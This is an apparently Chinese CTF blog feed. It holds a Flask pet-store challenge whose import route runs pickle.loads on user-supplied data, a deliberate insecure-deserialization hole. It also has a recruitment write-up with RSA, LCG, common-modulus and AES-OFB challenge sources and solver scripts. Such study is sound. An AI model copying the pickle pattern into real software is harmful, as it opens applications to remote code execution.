<span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Pet(name=<span class="subst">&#123;self.name&#125;</span>, species=<span class="subst">&#123;self.species&#125;</span>, uuid=<span class="subst">&#123;self.uuid&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PetStore</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.pets = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_pet</span>(<span class="params">self, name, species</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        pet = Pet(name, species)</span><br><span class="line">        self.pets.append(pet)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_pet</span>(<span class="params">self, pet_uuid</span>) -&gt; Pet | <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> pet <span class="keyword">in</span> self.pets:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(pet.uuid) == pet_uuid:</span><br><span class="line">                <span class="keyword">return</span> pet</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">export_pet</span>(<span class="params">self, pet_uuid</span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">        pet = self.get_pet(pet_uuid)</span><br><span class="line">        <span class="keyword">if</span> pet <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.pets.remove(pet)</span><br><span class="line">            serialized_pet = base64.b64encode(pickle.dumps(pet)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> serialized_pet</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">import_pet</span>(<span class="params">self, serialized_pet</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pet_data = base64.b64decode(serialized_pet)</span><br><span class="line">            pet = pickle.loads(pet_data)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(pet, Pet):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> self.pets:</span><br><span class="line">                    <span class="keyword">if</span> i.uuid == pet.uuid:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                self.pets.append(pet)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">store = PetStore()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    pets = store.pets</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, pets=pets)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_pet</span>():</span><br><span class="line">    name = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    species = request.form[<span class="string">&quot;species&quot;</span>]</span><br><span class="line">    store.create_pet(name, species)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/get&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pet</span>():</span><br><span class="line">    pet_uuid = request.form[<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    pet = store.get_pet(pet_uuid)</span><br><span class="line">    <span class="keyword">if</span> pet <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;name&quot;</span>: pet.name, <span class="string">&quot;species&quot;</span>: pet.species, <span class="string">&quot;uuid&quot;</span>: pet.uuid&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Pet not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/export&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">export_pet</span>():</span><br><span class="line">    pet_uuid = request.form[<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    serialized_pet = store.export_pet(pet_uuid)</span><br><span class="line">    <span class="keyword">if</span> serialized_pet <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;serialized_pet&quot;</span>: serialized_pet&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Pet not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/import&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">import_pet</span>():</span><br><span class="line">    serialized_pet = request.form[<span class="string">&quot;serialized_pet&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> store.import_pet(serialized_pet):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Failed to import pet&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>没打</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>时间有时是集中的，有时是零零碎碎的，所以打起来也是零零碎碎的，战线一拉长就是会出这种问题，因为不是只干这一个比赛</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#crypto&quot;&gt;&lt;/a&gt; Crypto&lt;/h1&gt;
&lt;p&gt;给两个比较完善的&lt;code&gt;CRYPTO&lt;/code&gt;方向的&lt;code&gt;wp&lt;/code&gt;&lt;br /&gt;
&lt;a href=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>cnss-recruit-2024</title>
    <link href="https://hvang10.github.io/2024/10/10/cnss-recruit-2024/"/>
    <id>https://hvang10.github.io/2024/10/10/cnss-recruit-2024/</id>
    <published>2024-10-10T02:52:46.000Z</published>
    <updated>2025-03-21T17:42:14.866Z</updated>
    
    <content type="html"><![CDATA[<p>密码全题目<a href="https://pqgcg6fs2k6.feishu.cn/wiki/Z93RwKTZZiYftskDqbAcDyyenkh?from=from_copylink">链接</a><br />当初为了以后拷打学弟，全下了</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="雨霖铃"><a class="markdownIt-Anchor" href="#雨霖铃"></a> 😢 雨霖铃</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line">flag = getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chal</span>():</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    phi = e</span><br><span class="line">    <span class="keyword">while</span> GCD(e, phi) != <span class="number">1</span>:</span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        n = p * q</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Alice -&gt; Bob :The public key  &#123;&#123;&#x27;n&#x27;:<span class="subst">&#123;<span class="built_in">hex</span>(n)&#125;</span>,&#x27;e&#x27;:<span class="subst">&#123;<span class="built_in">hex</span>(e)&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    mess = <span class="string">b&quot;I l0ve you---Bob&quot;</span></span><br><span class="line">    m = long_to_bytes(mess)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Bob -&gt; Alice :The encrypted message &#123;&#123;&#x27;c&#x27;:<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">pow</span>(m,e,n))&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You can change the message Bob sent to Alice to help them study&quot;</span>)</span><br><span class="line">    c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input the encrypted message (in hex)&quot;</span>),<span class="number">16</span>)</span><br><span class="line">    message = bytes_to_long(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">b&quot;Please keep away from me, I had to study hard&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chal()</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mo>≡</mo><msup><mi>c</mi><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">message\equiv c^{d}mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65819em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>≡</mo><mo stretchy="false">(</mo><mi>m</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c\equiv (message)^{e}mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><h2 id="快乐王子"><a class="markdownIt-Anchor" href="#快乐王子"></a> 😊 快乐王子</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 94933879657019461326828225836780893807400776971235851915066913763683310991309173340557406241075423730347734496950200533575670368627940332981373490699790129749566410150515572724861054835984481560010703671000134856172771048226985683127931612726872883032424421652451138053080169329061035399029500996664744339122</span></span><br><span class="line"><span class="string">p = 95855494001984957858370499068727677198914989191424438110665096413160144326163172754989614826773164540454657124564339977787908884977761972381683644262327181870316948741995100389232827854834171961842471759416662384703036141181130961351694018591639607368956764660290603455362026824834672239118472771981866952759</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, p-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, p)).decode())</span><br></pre></td></tr></table></figure><p>PS: 单素数十分不安全</p><h2 id="滕王阁序"><a class="markdownIt-Anchor" href="#滕王阁序"></a> 🦆 滕王阁序</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">N = <span class="number">2</span>**<span class="number">32</span></span><br><span class="line"></span><br><span class="line">a = randint(<span class="number">1</span>, N)</span><br><span class="line">b = randint(<span class="number">1</span>, N)</span><br><span class="line">seed = randint(<span class="number">1</span>, N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed = (seed * a + b) % N</span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">10</span></span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    lst.append(gen())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(lst[:<span class="number">3</span>])</span><br><span class="line">flag = <span class="string">&quot;cnss&#123;&quot;</span> + sha256(<span class="built_in">str</span>(lst).encode()).digest().<span class="built_in">hex</span>() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[1191871952, 424959397, 2071728008]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>简单<code>LCG</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed = (seed * a + b) % N</span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">lst = [<span class="number">1191871952</span>, <span class="number">424959397</span>, <span class="number">2071728008</span>]</span><br><span class="line">a = (lst[<span class="number">2</span>]-lst[<span class="number">1</span>]) * inverse(lst[<span class="number">1</span>]-lst[<span class="number">0</span>], N) % N</span><br><span class="line">b = (lst[<span class="number">1</span>] - a * lst[<span class="number">0</span>]) % N</span><br><span class="line">seed = (lst[<span class="number">0</span>]-b)*inverse(a, N) % N</span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    lst.append(gen())</span><br><span class="line">flag = <span class="string">&quot;cnss&#123;&quot;</span> + sha256(<span class="built_in">str</span>(lst).encode()).digest().<span class="built_in">hex</span>() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="苦昼短"><a class="markdownIt-Anchor" href="#苦昼短"></a> 😴 苦昼短</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, getRandomNBitInteger</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">b&quot;th3ory&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">35</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">e1 = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">e2 = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e1 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e2 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c1 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c2 = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 6515170721824235610077767341836933885840875127391251414241431058649905695517146798474612659595551169142861886184506103913942899261023340287984546344722437</span></span><br><span class="line"><span class="string">e1 = 7629805664186543656889446705637291540349114025875443716836563834859596597787836018342790489334721556488151377780074075791508513529215301207684062773549978</span></span><br><span class="line"><span class="string">e2 = 9039921587803845152307464731958928360172176091850551461858009351504282865228004545395872265680096691496208319524680982403075570587404216482639595725937778</span></span><br><span class="line"><span class="string">c1 = 4051037378975864795768433612586859935577401638900306752031195646978965789412075981397854666117503427453968376495404896921769061877453267600673695437655064</span></span><br><span class="line"><span class="string">c2 = 1553033793693524308294676475858121205684586044416915406366461468291436664838155112756117928278740586233365774778368046411859650684761456474837957111920903</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>共模攻击，但<code>e</code>不互素，<code>GCD(e1,e2)=2</code>，然后打<strong>明文高低位泄露</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">6515170721824235610077767341836933885840875127391251414241431058649905695517146798474612659595551169142861886184506103913942899261023340287984546344722437</span></span><br><span class="line">e1 = <span class="number">7629805664186543656889446705637291540349114025875443716836563834859596597787836018342790489334721556488151377780074075791508513529215301207684062773549978</span></span><br><span class="line">e2 = <span class="number">9039921587803845152307464731958928360172176091850551461858009351504282865228004545395872265680096691496208319524680982403075570587404216482639595725937778</span></span><br><span class="line">c1 = <span class="number">4051037378975864795768433612586859935577401638900306752031195646978965789412075981397854666117503427453968376495404896921769061877453267600673695437655064</span></span><br><span class="line">c2 = <span class="number">1553033793693524308294676475858121205684586044416915406366461468291436664838155112756117928278740586233365774778368046411859650684761456474837957111920903</span></span><br><span class="line">s, x, y = gmpy2.gcdext(e1, e2)</span><br><span class="line">m_2 = (<span class="built_in">pow</span>(c1, x, n)*<span class="built_in">pow</span>(c2, y, n)) % n</span><br><span class="line">m_high = bytes_to_long(<span class="string">b&#x27;cnss&#123;&#x27;</span>)</span><br><span class="line">m_low = bytes_to_long(<span class="string">b&#x27;th3ory&#125;&#x27;</span>)</span><br><span class="line">R.&lt; x &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = ((m_high &lt;&lt; <span class="number">240</span>)+x*<span class="number">2</span> ^ <span class="number">56</span>+m_low)^<span class="number">2</span>-m_2</span><br><span class="line">f = f.monic()</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span> ^ <span class="number">184</span>, beta=<span class="number">0.4</span>,epsilon=<span class="number">0.02</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    m = (m_high &lt;&lt; <span class="number">240</span>)+<span class="built_in">int</span>(root)*<span class="number">2</span> ^ <span class="number">56</span>+m_low</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h2 id="詩超絆"><a class="markdownIt-Anchor" href="#詩超絆"></a> 🐬 詩超絆</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag_pic = f.read()</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher  = AES.new(key = key, mode = AES.MODE_OFB, iv = os.urandom(<span class="number">16</span>))</span><br><span class="line">enc_pic = cipher.encrypt(pad(flag_pic, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;key = <span class="subst">&#123;key&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;enc_pic = <span class="subst">&#123;enc_pic&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>可参考<a href="https://hvang10.github.io/2024/07/13/OSCTF2024/">Sheep Counting</a>，不过它那里是<code>ECB</code>模式，这里是<code>OFB</code>模式，我们只要获取到一开始<code>iv</code>加密后的密钥流作为后续解密的初始向量即可，具体原理学习<code>OFB</code>模式即可理解</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line">key = <span class="string">b&#x27;k\x18\xb9\xd2\x1f\xfb\xe8\nrz\xfaV\xd7\x1dB\xe4&#x27;</span></span><br><span class="line">enc_pic = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line">png_head = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;89504e470d0a1a0a0000000d49484452&#x27;</span>)</span><br><span class="line">iv = xor(enc_pic[:<span class="number">16</span>], png_head)</span><br><span class="line">aes = AES.new(key=key, mode=AES.MODE_OFB, iv=iv)</span><br><span class="line">flag = png_head+aes.decrypt(enc_pic[<span class="number">16</span>:])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag)</span><br></pre></td></tr></table></figure><h2 id="️-春日影"><a class="markdownIt-Anchor" href="#️-春日影"></a> ❤️ 春日影()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line">flag = getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prod</span>(<span class="params">ells</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> ells == [] <span class="keyword">else</span> ells[<span class="number">0</span>] * prod(ells[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = <span class="number">2</span> * prod([getPrime(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">past = <span class="string">b&quot;Welcome to cnss recruitment 2024!&quot;</span></span><br><span class="line">now = <span class="string">b&quot;Congratulations! We hope you can join us!&quot;</span></span><br><span class="line"></span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&quot;Enter your code to pass the time! &gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([c == <span class="string">&quot;+&quot;</span> <span class="keyword">or</span> c == <span class="string">&quot;*&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> code]) <span class="keyword">and</span> <span class="built_in">len</span>(code) &lt; <span class="number">512</span></span><br><span class="line"></span><br><span class="line">past = <span class="built_in">int</span>(hashlib.sha256(past).hexdigest(), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        past = past + past</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        past = past * past</span><br><span class="line">    past %= p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> past == <span class="built_in">int</span>(hashlib.sha256(now).hexdigest(), <span class="number">16</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;You make it! The flag is <span class="subst">&#123;flag&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>nc 152.136.11.155 10065</code></p><p><code>past</code>不断地，乘2或平方之后取模<code>p</code>要等于<code>now</code><br />说实话，没什么思路</p><h2 id="else"><a class="markdownIt-Anchor" href="#else"></a> 